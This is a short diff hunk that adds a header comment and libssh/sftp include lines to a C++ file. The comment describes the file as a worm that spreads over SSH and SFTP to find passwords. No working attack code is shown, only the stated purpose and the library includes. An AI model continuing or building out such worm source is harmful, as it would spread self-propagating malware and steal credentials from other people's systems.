@@ -1,3 +1,8 @@
+//Start Date : 24-09-2024
+//author - apocalypse9949(me)
+//description - WORM using sftp and ssh connection for password finding in (any)OS but (tails os or tor based OS)
+//WARNING!!
+
 #include <libssh/libssh.h>  // Include the SSH library
 #include <libssh/sftp.h>    // Include the SFTP library for file transfer
 #include <iostream>         // For input-output operations
